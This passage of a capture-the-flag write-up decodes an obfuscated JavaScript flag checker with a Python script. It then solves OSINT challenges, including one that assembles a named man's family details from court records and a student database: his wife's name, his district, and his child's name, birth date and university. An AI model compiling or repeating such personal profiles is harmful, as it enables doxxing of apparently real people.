-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt([]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) {
    console.log("Yeah, it's the flag!");
} else {
    console.log("Nope, try again.");
}

```

Opening the artifact, I found some pattern that compare `charCodeAt` with obfuscated number that created from JavaScript reversed composition pattern `-~[]`.

![alt text](/images/nclp/tilde/image.png)

I found reference https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Bitwise_NOT, Operator ~ will return -1. With that, `-~x ≡ x + 1`. For `[]`, because the value is null it will converted to 0.

We can implement this solver script to retrieve the flag:

```python
import re

src = open('tilde.js','r',encoding='utf-8').read()
re_cmp = re.compile(r"flag\.charCodeAt\(([^)]*)\)\s*==\s*([^)&|;]+)[)&|;]")

def count_pairs(expr: str) -> int:
    return len(re.findall(r"-~", re.sub(r"\s+","", expr)))

pairs = []
for idx_expr, val_expr in re_cmp.findall(src):
    idx = count_pairs(idx_expr)
    val = count_pairs(val_expr)
    pairs.append((idx, val))

pairs.sort()
maxi = pairs[-1][0]
arr = [0]*(maxi+1)
for i,v in pairs:
    arr[i]=v
print('Flag:', ''.join(map(chr, arr)))
```

Regex `re` catch every comparation. `countPairs` onlu count how much `-~` appears in expretion. The result used as **index** and **charCode**.

#### Flag
NCLPS1{it's_juzt_tild3_4nd_d4sh_w!th_sImplE_0bfu5cat3}

## OSINT
### Energy

#### Description
Go on vacation and see the beautiful view, just like infinity castle in real life. Can you find where is it, i just put the flag at there?!

Link: http://bit.ly/46wt9LG

#### Solution
From the URL we get an video.

![alt text](/images/nclp/energy/img.png)

I screenshoted the most visible building to analyze it.

![alt text](/images/nclp/energy/image.png)

Search it with google image and I found that's a PLTU Paiton Probolinggo building.

![alt text](/images/nclp/energy/image-1.png)

Search it on the gmaps then go to recent review to get the flag.

#### Flag
NCLPS1{wow_you_can_find_me_here_at_the_infinity_caslte_and_power_plant}

### Finding Ghostline

#### Description
Profil bad hacker "Ghostline" kembali muncul. Telemetri baseband cell tower menunjukkan lock ke Telkomsel dengan eNB ID 219025; B3 1800 sebagai anchor dan B40 2300 sebagai kapasitas. Intel lapangan mempersempit pergerakan Ghostline ke kawasan Klojen, Kota Malang (Jawa Timur - Indonesia). Pelaku diduga berada di dekat sebuah hotel. Sayangnya, catatan peta BTS internal kami sudah dipurge. Bisa bantu kamu mencari "Ghostline" dari informasi yang kami berikan?

Question 1
Apa MCC / MNC / Region dari eNB ID tersebut?

Question 2
Berapa Maximum Signal (RSRP) tertinggi dari salah satu Cell?. Answer format: XX dBM or -XX dBm

Question 3
Dimana latitude dan longitude cell tower tersebut? Maximum 1 number decimal. Answer format example: -444.4:22.2

Question 4
Temukan hotel terdekat di area tersebut yang kemungkinan menjadi posisi Ghostline?. Answer format: Name Hotel

Question 5
Temukan pesan rahasia di hotel tersebut. Answer format: NCLPS1{.*}

#### Solution
Because this is my first chall to doxx from ENB ID, I did little surfing and found threads https://www.ispreview.co.uk/talk/threads/how-to-see-which-cell-tower-i-have-connected-to.39090/ that tells ENB ID can be used to search `cell tower` with https://cellmapper.net.

![alt text](/images/nclp/ghostline/image.png)

In the search tab input the ENB ID and Malang according to the chall description.

![alt text](/images/nclp/ghostline/image-1.png)

First answer is 510 / 10 / 6204

![alt text](/images/nclp/ghostline/image-2.png)

Second answer is -78 dBm

![alt text](/images/nclp/ghostline/image-3.png)

Third answer is on the URL 

![alt text](/images/nclp/ghostline/image-4.png)

Fourth answer, enter the latitude and longitude to the gmaps then there is a hotel that accross with the tower location.

![alt text](/images/nclp/ghostline/image-5.png)
![alt text](/images/nclp/ghostline/image-6.png)

Fifth answer, open the recent review there is a review with base64 encoding, decode this and we get the flag.

#### Flag
NCLPS1{th4nk_y0u_f0r_suC3ssfuLly_f1nd_tHe_b4d_h4cKeR_e569df6f86}

### halo

#### Description
Halo, namaku Yonny Dwi Widodo. Aku mempunyai 2 anak dan 1 orang istri yang sangat cantik.

Note: This challenge is for educational purposes only. Do not misuse any information you find.

Question 1
Apa nama yang dipakai Yonny sebelum "Yonny Dwi Widodo"?. Answer format: UPPERCASE

Question 2
Siapa nama pasangan (istri) Yonny?. Answer format: UPPERCASE

Question 3
Di kecamatan apa Yonny tinggal?. Answer format: UPPERCASE

Question 4
Siapa nama anak pertama Yonny?. Answer format: UPPERCASE

Question 5
Kapan tanggal lahir anak pertama Yonny?. Answer format example: 11 Januari 1980

Question 6
Anak pertama Yonny pernah membuat artikel tentang AI. Apa judul artikel tersebut?

Question 7
Dimana anak pertama Yonny berkuliah?. Answer format example: Universitas Gadjah Mada

Question 8
Sebutkan tanggal mulai kuliah anak pertama Yonny. Answer format: 11 Januari 1980

#### Solution
![alt text](/images/nclp/halo/image.png)
![alt text](/images/nclp/halo/image-1.png)

With google dorking, I found two archive `putusan MA` from Yonny Dwi Widodo.

![alt text](/images/nclp/halo/image-2.png)

First answer is `YONI DWI WIDODO`.

![alt text](/images/nclp/halo/image-3.png)

Second answer is `ETRIN KUMAIDAH`.

![alt text](/images/nclp/halo/image-4.png)

Third answer is `KEPANJEN`.

![alt text](/images/nclp/halo/image-5.png)

Fourth answer is `CARISSA AULIA NORIKA SHANDY`.

![alt text](/images/nclp/halo/image-6.png)

Fifth answer is `29 September 2004`.

![alt text](/images/nclp/halo/image-7.png)

Sixth answer, Google dorking with the name of first kid as keyword we can know that she ever written a article `Artificial Intelligence Dalam Konteks Manusia: Transformasi Industri dan Kehidupan Sehari-hari Manusia`.

![alt text](/images/nclp/halo/img.jpg)

Seventh answer, Looking the data of the fist kid in the PDDIKTI, we know that she go to `Universitas Muhammadiyah Malang` and for the Eighth answer we can looked it up there too `18 September 2023`.

### hotdog

